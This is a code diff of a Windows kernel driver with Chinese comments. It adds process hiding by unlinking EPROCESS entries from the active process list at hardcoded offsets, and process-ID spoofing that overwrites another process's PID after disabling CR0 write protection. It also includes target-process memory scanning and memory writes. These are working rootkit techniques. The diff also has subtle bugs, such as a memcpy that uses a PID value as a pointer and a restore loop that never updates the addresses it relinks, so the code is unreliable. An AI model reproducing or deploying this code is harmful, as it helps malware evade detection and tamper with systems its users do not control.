@@ -19,7 +19,7 @@ PVAL createValidAddressNode(
     IN BOOLEAN executeFlag
 )
 {
-    PVAL newNode = (PVAL)ExAllocatePoolWithTag(PagedPool, sizeof(VAL), 'WWWW');
+    PVAL newNode = (PVAL)ExAllocatePoolWithTag(PagedPool, sizeof(VAL), 'vvvv');
     if (newNode)
     {
         newNode->beginAddress = begin;
@@ -33,6 +33,19 @@ PVAL createValidAddressNode(
     }
     return newNode;
 }
+VOID getRegionGapAndPages(
+    IN_OUT PVAL headVAL
+)
+{
+    PVAL temp = headVAL;
+    while (temp->ValidAddressEntry.Next != NULL)
+    {
+        temp->regionGap = temp->endAddress - temp->beginAddress;
+        temp->pageNums = (temp->regionGap / 0x1000) + 1;
+        temp = CONTAINING_RECORD(temp->ValidAddressEntry.Next, VAL, ValidAddressEntry);
+    }
+    return;
+}
 PRSL createSavedResultNode(
     IN ULONG times,
     IN ULONG64 address,
@@ -40,7 +53,7 @@ PRSL createSavedResultNode(
     IN PVAL headVAL
 )
 {
-    PRSL newNode = (PRSL)ExAllocatePoolWithTag(PagedPool, sizeof(RSL), 'VVVV');
+    PRSL newNode = (PRSL)ExAllocatePoolWithTag(PagedPool, sizeof(RSL), 'uuuu');
     if (newNode)
     {
         newNode->times = times;
@@ -63,7 +76,7 @@ PRSL createSavedResultNode(
         {
             if(newNode->address + newNode->rslAddressBufferLen <= newNode->thisNodeAddressPageMaxValidAddress)
             {
-                newNode->buffer = (PUCHAR)ExAllocatePoolWithTag(PagedPool, newNode->rslAddressBufferLen, 'DDDD');
+                newNode->buffer = (PUCHAR)ExAllocatePoolWithTag(PagedPool, newNode->rslAddressBufferLen, 'tttt');
                 for (size_t j = 0; j < newNode->rslAddressBufferLen && newNode->buffer; j++)
                 {
                     newNode->buffer[j] = *(UCHAR*)((ULONG64)address + j);
@@ -85,34 +98,39 @@ PRSL createSavedResultNode(
     }
     return newNode;
 }
-VOID getRegionGapAndPages(
-    IN_OUT PVAL headVAL
+PHPL createHiddenProcessNode(
+    IN ULONG64 pidOfHiddenProcess,
+    IN PEPROCESS eprocessHeaderOfHiddenProcess,
+    IN PLIST_ENTRY prevEntryAddress,
+    IN PLIST_ENTRY nextEntryAddress
 )
 {
-    PVAL temp = headVAL;
-    while (temp->ValidAddressEntry.Next != NULL)
+    PHPL newNode = (PHPL)ExAllocatePoolWithTag(PagedPool, sizeof(HPL), 'ssss');
+    if (newNode)
     {
-        temp->regionGap = temp->endAddress - temp->beginAddress;
-        temp->pageNums = (temp->regionGap / 0x1000) + 1;
-        temp = CONTAINING_RECORD(temp->ValidAddressEntry.Next, VAL, ValidAddressEntry);
+        newNode->pidAlreadyHidden = pidOfHiddenProcess;
+        newNode->eprocessHeaderAddressOfHiddenProcess = eprocessHeaderOfHiddenProcess;
+        newNode->prevProcessEntry = prevEntryAddress;
+        newNode->nextProcessEntry = nextEntryAddress;
+        newNode->HiddenProcessEntry.Flink = NULL;
+        newNode->HiddenProcessEntry.Blink = NULL;
     }
-    return;
+    return newNode;
 }
-ULONG64 getMaxRegionPages(
-    IN PVAL head
+PPPL createPretentProcessNode(
+    IN ULONG64 dirtyPID,
+    IN ULONG64 parasitePID
 )
 {
-    PVAL temp = head;
-    ULONG64 ret = 0x0;
-    while (temp->ValidAddressEntry.Next != NULL)
+    PPPL newNode = (PPPL)ExAllocatePoolWithTag(PagedPool, sizeof(PPL), 'rrrr');
+    if (newNode)
     {
-        if (temp->pageNums >= ret)
-        {
-            ret = temp->pageNums;
-        }
-        temp = CONTAINING_RECORD(temp->ValidAddressEntry.Next, VAL, ValidAddressEntry);
+        newNode->dirtyPID = dirtyPID;
+        newNode->parasitePID = parasitePID;
+        newNode->PretentProcessEntry.Flink = NULL;
+        newNode->PretentProcessEntry.Blink = NULL;
     }
-    return ret;
+    return newNode;
 }
 VOID computeLPSArray(
     IN CONST UCHAR* pattern,
@@ -233,7 +251,7 @@ BOOLEAN isSame(
     return 1;
 }
 BOOLEAN checkAllRSLAddressLenValid(
-    PRSL headRSL
+    IN PRSL headRSL
 )
 {
     PRSL temp = headRSL;
@@ -288,38 +306,63 @@ VOID printListRSL(
         DbgPrint("%hhx", temp->buffer[j]);
     }
 }
-VOID ReadBuffer(
-    IN PVOID bufferHead,
-    IN SIZE_T size
+VOID printListHPL(
+    IN PHPL headHPL
 )
 {
-    ULONG64 temp = (ULONG64)bufferHead;
-    for (size_t j = 0; j < size - 16; j += 16)
+    PHPL temp = headHPL;
+    while (temp->HiddenProcessEntry.Flink != &headHPL->HiddenProcessEntry)
     {
-        DbgPrint("%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t%hhx\t",
-            *(UCHAR*)(temp + j + 0),
-            *(UCHAR*)(temp + j + 1),
-            *(UCHAR*)(temp + j + 2),
-            *(UCHAR*)(temp + j + 3),
-            *(UCHAR*)(temp + j + 4),
-            *(UCHAR*)(temp + j + 5),
-            *(UCHAR*)(temp + j + 6),
-            *(UCHAR*)(temp + j + 7),
-            *(UCHAR*)(temp + j + 8),
-            *(UCHAR*)(temp + j + 9),
-            *(UCHAR*)(temp + j + 10),
-            *(UCHAR*)(temp + j + 11),
-            *(UCHAR*)(temp + j + 12),
-            *(UCHAR*)(temp + j + 13),
-            *(UCHAR*)(temp + j + 14),
-            *(UCHAR*)(temp + j + 15)
-        );
+        DbgPrint("Hidden processes pid: %llx, eprocess header address: 0x%p, prevEntryAddress: 0x%p, nextEntryAddress: 0x%p", (ULONG64)temp->pidAlreadyHidden, (PVOID)temp->eprocessHeaderAddressOfHiddenProcess, (PVOID)temp->prevProcessEntry, (PVOID)temp->nextProcessEntry);
+        temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
     }
+    DbgPrint("Hidden processes pid: %llx, eprocess header address: 0x%p, prevEntryAddress: 0x%p, nextEntryAddress: 0x%p", (ULONG64)temp->pidAlreadyHidden, (PVOID)temp->eprocessHeaderAddressOfHiddenProcess, (PVOID)temp->prevProcessEntry, (PVOID)temp->nextProcessEntry);
+}
+VOID printListPPL(
+    IN PPPL headPPL
+)
+{
+    PPPL temp = headPPL;
+    while (temp->PretentProcessEntry.Flink != &headPPL->PretentProcessEntry)
+    {
+        DbgPrint("Pretent process pid: %llu, parasite process pid: %llu", temp->dirtyPID, temp->parasitePID);
+        temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
+    }
+    DbgPrint("Pretent process pid: %llu, parasite process pid: %llu", temp->dirtyPID, temp->parasitePID);
+}
+ULONG64 getMaxRegionPages(
+    IN PVAL head
+)
+{
+    PVAL temp = head;
+    ULONG64 ret = 0x0;
+    while (temp->ValidAddressEntry.Next != NULL)
+    {
+        if (temp->pageNums >= ret)
+        {
+            ret = temp->pageNums;
+        }
+        temp = CONTAINING_RECORD(temp->ValidAddressEntry.Next, VAL, ValidAddressEntry);
+    }
+    return ret;
+}
+SIZE_T getNodeNumsForDoubleLinkedList(
+    IN PRSL headRSL
+)
+{
+    PRSL temp = headRSL;
+    SIZE_T cnt = 0x0;
+    while (temp->ResultAddressEntry.Flink != &headRSL->ResultAddressEntry)
+    {
+        cnt++;
+        temp = CONTAINING_RECORD(temp->ResultAddressEntry.Flink, RSL, ResultAddressEntry);
+    }
+    return cnt;
 }
 UCHAR farBytesDiffer(
-    PUCHAR oldPattern,
-    PUCHAR newPattern,
-    SIZE_T minSize
+    IN PUCHAR oldPattern,
+    IN PUCHAR newPattern,
+    IN SIZE_T minSize
 )
 {
     for (SSIZE_T j = minSize - 1; j >= 0; j--)
@@ -410,7 +453,7 @@ VOID buildDoubleLinkedAddressListForPatternStringByKMPAlgorithm(
     KeStackAttachProcess(pe, &apc);
     while (temp->ValidAddressEntry.Next != NULL)
     {
-        UCHAR* bufferReceive = (UCHAR*)ExAllocatePoolWithTag(PagedPool, temp->pageNums * 4096, 'TTTT');
+        UCHAR* bufferReceive = (UCHAR*)ExAllocatePoolWithTag(PagedPool, temp->pageNums * 4096, 'qqqq');
         UL64 addressNeedFree = 0x0;
         __try
         {
@@ -430,42 +473,6 @@ VOID buildDoubleLinkedAddressListForPatternStringByKMPAlgorithm(
     }
     KeUnstackDetachProcess(&apc);
     ObDereferenceObject(pe);
-}
-SIZE_T getNodeNumsForDoubleLinkedList(
-    IN PRSL headRSL
-)
-{
-    PRSL temp = headRSL;
-    SIZE_T cnt = 0x0;
-    while (temp->ResultAddressEntry.Flink != &headRSL->ResultAddressEntry)
-    {
-        cnt++;
-        temp = CONTAINING_RECORD(temp->ResultAddressEntry.Flink, RSL, ResultAddressEntry);
-    }
-    return cnt;
-}
-VOID processHiddenProcedure(
-    IN ULONG64 pid
-)
-{
-    PEPROCESS pe = IoGetCurrentProcess();
-    ULONG64 UniqueProcessIdOffset = 0x440;
-    ULONG64 ActiveProcessLinksOffset = 0x448;
-    PLIST_ENTRY thisPeNode = NULL;
-    while (*(ULONG64*)((ULONG64)pe + UniqueProcessIdOffset) != pid)
-    {
-        thisPeNode = (PLIST_ENTRY)((ULONG64)pe + ActiveProcessLinksOffset);
-        pe = (PEPROCESS)((UL64)thisPeNode->Flink - ActiveProcessLinksOffset);
-    }
-    DbgPrint("***%p***", *(HANDLE*)((ULONG64)pe + UniqueProcessIdOffset));
-    //这个pe就是目标pid的进程，接下来是断链隐藏
-    PLIST_ENTRY currPeListEntryAddress = (PLIST_ENTRY)((UL64)pe + ActiveProcessLinksOffset);
-    PLIST_ENTRY prevPeListEntryAddress = currPeListEntryAddress->Blink;
-    PLIST_ENTRY nextPeListEntryAddress = currPeListEntryAddress->Flink;
-    prevPeListEntryAddress->Flink = nextPeListEntryAddress;
-    nextPeListEntryAddress->Blink = prevPeListEntryAddress;
-    DbgPrint("进程0x%p(%llu)已经断链隐藏.", (PVOID)pid, pid);
-    return;
 }
 VOID displayAllModuleInfomationByProcessId(
     IN ULONG64 pid
@@ -530,42 +537,155 @@ VOID writeProcessMemory(
     ObDereferenceObject(pe);
     return;
 }
-VOID processPretent(
-    IN HANDLE pid_dirty,
-    IN HANDLE pid_clean,
-    OUT PEPROCESS* dirtyPEmark
+VOID processHiddenProcedure(
+    IN ULONG64 pid,
+    IN PHPL* headHPL
 )
 {
-    PEPROCESS pe = NULL;
-    PsLookupProcessByProcessId((HANDLE)pid_dirty, &pe);
-    *dirtyPEmark = pe;
+    PEPROCESS pe = IoGetCurrentProcess();
+    ULONG64 UniqueProcessIdOffset = 0x440;
+    ULONG64 ActiveProcessLinksOffset = 0x448;
+    PLIST_ENTRY thisPeNode = NULL;
+    while (*(ULONG64*)((ULONG64)pe + UniqueProcessIdOffset) != pid)
+    {
+        thisPeNode = (PLIST_ENTRY)((ULONG64)pe + ActiveProcessLinksOffset);
+        pe = (PEPROCESS)((UL64)thisPeNode->Flink - ActiveProcessLinksOffset);
+    }
+    //DbgPrint("***%p***", *(HANDLE*)((ULONG64)pe + UniqueProcessIdOffset));
+    //这个pe就是目标pid的进程，接下来是断链隐藏
+    PLIST_ENTRY currPeListEntryAddress = (PLIST_ENTRY)((UL64)pe + ActiveProcessLinksOffset);
+    PLIST_ENTRY prevPeListEntryAddress = currPeListEntryAddress->Blink;
+    PLIST_ENTRY nextPeListEntryAddress = currPeListEntryAddress->Flink;
+    prevPeListEntryAddress->Flink = nextPeListEntryAddress;
+    nextPeListEntryAddress->Blink = prevPeListEntryAddress;
+    if (*headHPL == NULL)
+    {
+        PHPL newNode = createHiddenProcessNode((ULONG64)pid, pe, prevPeListEntryAddress, nextPeListEntryAddress);
+        (*headHPL) = newNode;
+        (*headHPL)->HiddenProcessEntry.Flink = &((*headHPL)->HiddenProcessEntry);
+        (*headHPL)->HiddenProcessEntry.Blink = (*headHPL)->HiddenProcessEntry.Flink;
+    }
+    else
+    {
+        PHPL temp = *headHPL;
+        while (temp->HiddenProcessEntry.Flink != &((*headHPL)->HiddenProcessEntry))
+        {
+            temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
+        }
+        PHPL newNode = createHiddenProcessNode((ULONG64)pid, pe, prevPeListEntryAddress, nextPeListEntryAddress);
+        if (newNode)
+        {
+            temp->HiddenProcessEntry.Flink = &newNode->HiddenProcessEntry;
+            newNode->HiddenProcessEntry.Flink = &((*headHPL)->HiddenProcessEntry);
+            newNode->HiddenProcessEntry.Blink = &temp->HiddenProcessEntry;
+            (*headHPL)->HiddenProcessEntry.Blink = &newNode->HiddenProcessEntry;
+        }
+    }
+    DbgPrint("进程0x%p(%llu)已经断链隐藏.", (PVOID)pid, pid);
+    return;
+}
+VOID restoreHiddenProcess(
+    IN PHPL headHPL
+)
+{
+    PHPL temp = headHPL;
+    ULONG64 activeProcessLinksAddress = 0x448;
+    PLIST_ENTRY thisNodePrevNodeEntryAddress = temp->prevProcessEntry;
+    PLIST_ENTRY thisNodeEntryAddress = (PLIST_ENTRY)((ULONG64)temp->eprocessHeaderAddressOfHiddenProcess + activeProcessLinksAddress);
+    PLIST_ENTRY thisNodeNextNodeEntryAddress = temp->nextProcessEntry;
+    while (temp->HiddenProcessEntry.Flink != &headHPL->HiddenProcessEntry)
+    {
+        temp->prevProcessEntry->Flink = thisNodeEntryAddress;
+        thisNodeEntryAddress->Flink = thisNodeNextNodeEntryAddress;
+        thisNodeNextNodeEntryAddress->Blink = thisNodeEntryAddress;
+        thisNodeEntryAddress->Blink = thisNodePrevNodeEntryAddress;
+        temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
+    }
+    temp->prevProcessEntry->Flink = thisNodeEntryAddress;
+    thisNodeEntryAddress->Flink = thisNodeNextNodeEntryAddress;
+    thisNodeNextNodeEntryAddress->Blink = thisNodeEntryAddress;
+    thisNodeEntryAddress->Blink = thisNodePrevNodeEntryAddress;
+}
+VOID processPretentProcedure(
+    IN HANDLE dirtyPID,
+    IN HANDLE parasitePID,
+    OUT PPPL* headPPL
+)
+{
     ULONG64 uniqueProcessIDOffset = 0x440;
-    ULONG64 pidDirtyAddress = (ULONG64)pe + uniqueProcessIDOffset;
-    ULONG64 pidCleanSaved = (ULONG64)pid_clean;
+    PEPROCESS dirtyPE = NULL;
+    PsLookupProcessByProcessId((HANDLE)dirtyPID, &dirtyPE);
+    ULONG64 dirtyPIDAddress = (ULONG64)dirtyPE + uniqueProcessIDOffset;
+    ULONG64 tempParasitePid = parasitePID;
     ULONG64 oldCR0 = 0x0; 
     __asm__WRbreak(&oldCR0); 
-    memcpy((PVOID)pidDirtyAddress, (PVOID)&pidCleanSaved, sizeof(HANDLE)); 
+    memcpy((PVOID)dirtyPIDAddress, (PVOID)tempParasitePid, sizeof(HANDLE));
     __asm__WRrestore(oldCR0);
+    if (*headPPL == NULL)
+    {
+        *headPPL = createPretentProcessNode(
+            (ULONG64)dirtyPID, 
+            (ULONG64)parasitePID
+        );
+        (*headPPL)->PretentProcessEntry.Flink = &((*headPPL)->PretentProcessEntry);
+        (*headPPL)->PretentProcessEntry.Blink = (*headPPL)->PretentProcessEntry.Flink;
+    }
+    else
+    {
+        PPPL temp = *headPPL;
+        while (temp->PretentProcessEntry.Flink != &((*headPPL)->PretentProcessEntry))
+        {
+            temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
+        }
+        PPPL newNode = createPretentProcessNode(
+            (ULONG64)dirtyPID,
+            (ULONG64)parasitePID
+        );
+        if (newNode)
+        {
+            temp->PretentProcessEntry.Flink = &newNode->PretentProcessEntry;
+            newNode->PretentProcessEntry.Flink = &((*headPPL)->PretentProcessEntry);
+            newNode->PretentProcessEntry.Blink = &temp->PretentProcessEntry;
+            (*headPPL)->PretentProcessEntry.Blink = &newNode->PretentProcessEntry;
+        }
+    }
     return;
 }
-VOID processPretentRestore(
-    IN PEPROCESS dirtyPE,
-    IN HANDLE pid_dirty
+VOID restorePretentProcess(
+    IN PPPL headPPL
 )
 {
-    ULONG64 pid = (ULONG64)pid_dirty;
+    PPPL temp = headPPL;
+    while(temp->PretentProcessEntry.Flink != &headPPL->PretentProcessEntry)
+    {
+        PEPROCESS dirtyPE = NULL;
+        PsLookupProcessByProcessId((HANDLE)temp->dirtyPID, &dirtyPE);
+        ULONG64 tempDirtyPid = temp->dirtyPID;
+        ULONG64 oldCR0 = 0x0;
+        __asm__WRbreak(&oldCR0);
+        //KeBugCheckEx(0x22222222, 0, 0, 0, 0);
+        memcpy((PVOID)((ULONG64)dirtyPE + 0x440), (PVOID)&tempDirtyPid, sizeof(HANDLE));
+        //KeBugCheckEx(0x33333333, 0, 0, 0, 0);
+        __asm__WRrestore(oldCR0);
+        ObDereferenceObject(dirtyPE);
+        temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
+    }
+    PEPROCESS dirtyPE = NULL;
+    PsLookupProcessByProcessId((HANDLE)temp->dirtyPID, &dirtyPE);
+    ULONG64 tempDirtyPid = temp->dirtyPID;
     ULONG64 oldCR0 = 0x0;
     __asm__WRbreak(&oldCR0);
-    memcpy((PVOID)((ULONG64)dirtyPE + 0x440), (PVOID)&pid, sizeof(HANDLE));
-    DbgPrint("%p", *(HANDLE*)((ULONG64)dirtyPE + 0x440));
+    //KeBugCheckEx(0x22222222, 0, 0, 0, 0);
+    memcpy((PVOID)((ULONG64)dirtyPE + 0x440), (PVOID)&tempDirtyPid, sizeof(HANDLE));
+    //KeBugCheckEx(0x33333333, 0, 0, 0, 0);
     __asm__WRrestore(oldCR0);
-    return;
+    ObDereferenceObject(dirtyPE);
 }
 VOID readImagePathNameAndCommandLine(
-    HANDLE pid
+    IN HANDLE pid
 )
 {
-    //有时应该蓝屏但是没蓝屏：看看下没下内核断点KdBreakPoint！！
+    //如果遇到应该蓝屏但是没蓝屏：看看下没下内核断点KdBreakPoint！！
     PEPROCESS pe = NULL;
     PsLookupProcessByProcessId(pid, &pe);
     KAPC_STATE apc = { 0 };
@@ -623,3 +743,31 @@ VOID ExFreeValidAddressLink(
     原因在于temp->ValidAddressEntry.Next == NULL的时候最后一块内存没释放
     所以导致了内存泄漏
 */
+VOID ExFreeHiddenProcessLink(
+    OUT PHPL* headHPL
+)
+{
+    PHPL tempHPL = *headHPL;
+    while (tempHPL != NULL && tempHPL->HiddenProcessEntry.Flink != NULL)
+    {
+        PHPL tempX = CONTAINING_RECORD(tempHPL->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
+        tempHPL->HiddenProcessEntry.Flink = NULL;
+        tempHPL->HiddenProcessEntry.Blink = NULL;
+        ExFreePool(tempHPL);
+        tempHPL = tempX;
+    }
+}
+VOID ExFreePretentProcessLink(
+    OUT PPPL* headPPL
+)
+{
+    PPPL tempPPL = *headPPL;
+    while (tempPPL != NULL && tempPPL->PretentProcessEntry.Flink != NULL)
+    {
+        PPPL tempX = CONTAINING_RECORD(tempPPL->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
+        tempPPL->PretentProcessEntry.Flink = NULL;
+        tempPPL->PretentProcessEntry.Blink = NULL;
+        ExFreePool(tempPPL);
+        tempPPL = tempX;
+    }
+}
